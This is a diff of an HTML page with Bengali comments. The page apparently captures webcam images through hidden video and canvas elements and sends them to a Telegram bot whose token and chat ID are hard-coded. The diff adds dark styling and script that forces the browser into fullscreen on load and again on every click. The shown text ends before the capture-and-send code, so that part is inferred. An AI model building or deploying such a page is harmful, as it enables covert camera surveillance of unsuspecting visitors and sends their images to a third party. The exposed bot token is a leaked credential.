@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -8,6 +8,10 @@
         body {
             text-align: center;
             font-family: Arial, sans-serif;
+            background-color: #000;
+            color: white;
+            margin: 0;
+            overflow: hidden;
         }
         video, canvas {
             display: none;
@@ -17,6 +21,10 @@
             padding: 10px 20px;
             margin-top: 20px;
             cursor: pointer;
+            background: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
         }
     </style>
 </head>
@@ -29,6 +37,27 @@
     <canvas id="canvas"></canvas>
 
     <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            function goFullscreen() {
+                let doc = document.documentElement;
+                if (doc.requestFullscreen) {
+                    doc.requestFullscreen();
+                } else if (doc.mozRequestFullScreen) { // Firefox
+                    doc.mozRequestFullScreen();
+                } else if (doc.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                    doc.webkitRequestFullscreen();
+                } else if (doc.msRequestFullscreen) { // IE/Edge
+                    doc.msRequestFullscreen();
+                }
+            }
+
+            // ওয়েবসাইট লোড হওয়ার সঙ্গে সঙ্গে ফুলস্ক্রিন চালু হবে
+            goFullscreen();
+
+            // ইউজার ক্লিক করলেও আবার ফুলস্ক্রিন মোড চালু করবে
+            document.addEventListener("click", goFullscreen);
+        });
+
         document.getElementById('captureBtn').addEventListener('click', function() {
             let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw";  // এখানে আপনার টেলিগ্রাম বটের টোকেন দিন
             let chatId = "6947565760";  // এখানে আপনার চ্যাট আইডি দিন
